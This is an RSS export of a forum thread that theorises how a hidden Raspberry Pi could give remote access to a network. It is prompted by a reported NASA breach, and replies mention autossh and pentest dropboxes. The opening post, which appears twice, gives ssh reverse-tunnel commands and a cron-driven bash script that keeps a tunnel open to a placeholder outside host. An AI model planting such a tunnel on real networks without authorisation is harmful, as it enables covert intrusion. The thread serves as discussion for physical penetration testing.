<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[Theory] A word on Pi and SSH</title>
    <link>https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565</link>
    <description>If you haven&#39;t heard the [news](https://www.pcmag.com/news/369123/nasa-hack-used-a-raspberry-pi) of NASA getting hacked via an authorized raspberry pi... you live under a rock, but anyways this so called hack got me thinking. How easy it is to actually keep a raspberry pi undetectable both physically and also software wise? 

A few quick google searches and messing around on my rpi gave results that I find slightly scary (just slightly). My theory of how the hack went down was quite simple in nature... setup the pi at an ethernet port that is out of the way and also by a power source. Have it setup with something like raspbian with the option to automatically login as a certain user so therefore we have access to ssh which is enabled as a system service (launches upon boot). SSH should be running on a common port (e.g. 80, 443,  43). It is setup as a remote ssh tunnel with certificates and have it check every minute if it needs to be created via a cronjob. On our system we than listen on the port that the tunnel was created on and as the user at localhost.

This is actually really simple in nature and not my own original content. If you search up &#39;ssh reverse tunneling&#39; you will get a lot of articles on how to do this. The reason why this is possible is because of SSH&#39;s ability to locally port forward a port. The command in question is something along this:

```ssh -R 8080:localhost:22 myBoxxy@someLocalipAddress```

This is run on our pi or whatever. On our own laptop, we do something like this:

```ssh -p 8080 myPi@localhost```

So essentially if the theory is correct, all you have to do is setup a bash script to try to make the tunnel and have it be checked every minute via a cronjob. Of course if you want to do it on another network, you would have to port forward the port used. The bash script that I cannot take credit for is:

```bash
#!/usr/bin/env bash

createTunnel() {

     /usr/bin/ssh -o &#39;StrictHostKeyChecking no&#39; -N -R 8080:localhost:80 myBoxxy@someIPaddress

}

/bin/pidof ssh
if [[ $? -ne 0 ]]; then
          createTunnel
fi
```

Yeah I know. Really simple. Have a function that creates the tunnel and if the PID is 0, call that function.

Pretty much this proves how simple stuff can be:

1) Overlooked
2) Cause a huge security issue
3) A bit of creativity can go a long way

The latter is what I find intriguing. Humans have the tendency to over think certain things. They can patch all the &#39;critical and obvious&#39; vulns, but something as simple as a Bad USB drop or someone walking through the front door and installing a pi I find overlooked quite a bit.

I know. Quick and dirty, but this was just me sharing a theory. The limit is limitless.</description>
    
    <lastBuildDate>Tue, 25 Jun 2019 15:09:32 +0000</lastBuildDate>
    <category>Networking</category>
    <atom:link href="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[Theory] A word on Pi and SSH</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/4</link>
        <pubDate>Wed, 24 Jul 2019 15:21:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-14565-4</guid>
        <source url="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565.rss">[Theory] A word on Pi and SSH</source>
      </item>
      <item>
        <title>[Theory] A word on Pi and SSH</title>
        <dc:creator><![CDATA[Alice]]></dc:creator>
        <description><![CDATA[
            <p>I read about autossh briefly, but will take a peek at the article you posted.</p>
          <p><a href="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/3</link>
        <pubDate>Tue, 25 Jun 2019 15:09:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-14565-3</guid>
        <source url="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565.rss">[Theory] A word on Pi and SSH</source>
      </item>
      <item>
        <title>[Theory] A word on Pi and SSH</title>
        <dc:creator><![CDATA[Mrtn]]></dc:creator>
        <description><![CDATA[
            <p>We do this on our physical pentests. You can use a tool called autossh which will create a persistent SSH-connection back to a cloud server of your choosing. This is also how the reverse-SSH feature of Hak5’s LANTurtle works.</p>
<p>We used these as references when building ours;<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/a/aae9f7144639cbbec6e43bcd815fd8b2ca6146ba.png" class="site-icon" width="150" height="150">
      <a href="https://vdalabs.com/2018/02/06/penetration-testing-dropboxes/" target="_blank" rel="noopener nofollow ugc" title="11:11PM - 06 February 2018">VDA Labs – 6 Feb 18</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/272;"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7af3187da15e37c4caf6d009999cf42decb4adc2.jpeg" class="thumbnail" width="690" height="272" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7af3187da15e37c4caf6d009999cf42decb4adc2_2_10x10.png"></div>

<h3><a href="https://vdalabs.com/2018/02/06/penetration-testing-dropboxes/" target="_blank" rel="noopener nofollow ugc">Meet Our Droids: Penetration Testing Dropboxes - VDA Labs</a></h3>

<p>A rundown on the why, how, and what of VDA Labs penetration testing dropbox setup. We go over why we rely on dropboxes, how some of the configurations work and what the specific hardware is that we use.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/053970046edb4ae60e77f8cb595cbda70d9b5e0c.png" class="site-icon" width="36" height="36">
      <a href="https://www.blackhillsinfosec.com/how-to-build-your-own-penetration-testing-drop-box/" target="_blank" rel="noopener nofollow ugc" title="12:55PM - 03 August 2016">Black Hills Information Security – 3 Aug 16</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/388;"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bdad0e1d65c789305cac5da99c25622c9edeb734_2_690x388.png" class="thumbnail" width="690" height="388" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bdad0e1d65c789305cac5da99c25622c9edeb734_2_690x388.png, https://0x00sec.s3.amazonaws.com/optimized/2X/b/bdad0e1d65c789305cac5da99c25622c9edeb734_2_1035x582.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/bdad0e1d65c789305cac5da99c25622c9edeb734.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bdad0e1d65c789305cac5da99c25622c9edeb734_2_10x10.png"></div>

<h3><a href="https://www.blackhillsinfosec.com/how-to-build-your-own-penetration-testing-drop-box/" target="_blank" rel="noopener nofollow ugc">How to Build Your Own Penetration Testing Drop Box - Black Hills Information...</a></h3>

<p>Beau Bullock // TL;DR I compared three single-board computers (SBC) against each other with a specific goal of finding which one would serve best as a “penetration testing dropbox”, and maintain an overall price of around $110. Spoiler Alert:&nbsp;At...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/2</link>
        <pubDate>Mon, 24 Jun 2019 23:37:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-14565-2</guid>
        <source url="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565.rss">[Theory] A word on Pi and SSH</source>
      </item>
      <item>
        <title>[Theory] A word on Pi and SSH</title>
        <dc:creator><![CDATA[Alice]]></dc:creator>
        <description><![CDATA[
            <p>If you haven’t heard the <a href="https://www.pcmag.com/news/369123/nasa-hack-used-a-raspberry-pi" rel="nofollow noopener">news</a> of NASA getting hacked via an authorized raspberry pi… you live under a rock, but anyways this so called hack got me thinking. How easy it is to actually keep a raspberry pi undetectable both physically and also software wise?</p>
<p>A few quick google searches and messing around on my rpi gave results that I find slightly scary (just slightly). My theory of how the hack went down was quite simple in nature… setup the pi at an ethernet port that is out of the way and also by a power source. Have it setup with something like raspbian with the option to automatically login as a certain user so therefore we have access to ssh which is enabled as a system service (launches upon boot). SSH should be running on a common port (e.g. 80, 443,  43). It is setup as a remote ssh tunnel with certificates and have it check every minute if it needs to be created via a cronjob. On our system we than listen on the port that the tunnel was created on and as the user at localhost.</p>
<p>This is actually really simple in nature and not my own original content. If you search up ‘ssh reverse tunneling’ you will get a lot of articles on how to do this. The reason why this is possible is because of SSH’s ability to locally port forward a port. The command in question is something along this:</p>
<p><code>ssh -R 8080:localhost:22 myBoxxy@someLocalipAddress</code></p>
<p>This is run on our pi or whatever. On our own laptop, we do something like this:</p>
<p><code>ssh -p 8080 myPi@localhost</code></p>
<p>So essentially if the theory is correct, all you have to do is setup a bash script to try to make the tunnel and have it be checked every minute via a cronjob. Of course if you want to do it on another network, you would have to port forward the port used. The bash script that I cannot take credit for is:</p>
<pre><code class="lang-bash">#!/usr/bin/env bash

createTunnel() {

     /usr/bin/ssh -o 'StrictHostKeyChecking no' -N -R 8080:localhost:80 myBoxxy@someIPaddress

}

/bin/pidof ssh
if [[ $? -ne 0 ]]; then
          createTunnel
fi
</code></pre>
<p>Yeah I know. Really simple. Have a function that creates the tunnel and if the PID is 0, call that function.</p>
<p>Pretty much this proves how simple stuff can be:</p>
<ol>
<li>Overlooked</li>
<li>Cause a huge security issue</li>
<li>A bit of creativity can go a long way</li>
</ol>
<p>The latter is what I find intriguing. Humans have the tendency to over think certain things. They can patch all the ‘critical and obvious’ vulns, but something as simple as a Bad USB drop or someone walking through the front door and installing a pi I find overlooked quite a bit.</p>
<p>I know. Quick and dirty, but this was just me sharing a theory. The limit is limitless.</p>
          <p><a href="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565/1</link>
        <pubDate>Mon, 24 Jun 2019 15:21:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-14565-1</guid>
        <source url="https://0x00sec.org/t/theory-a-word-on-pi-and-ssh/14565.rss">[Theory] A word on Pi and SSH</source>
      </item>
  </channel>
</rss>
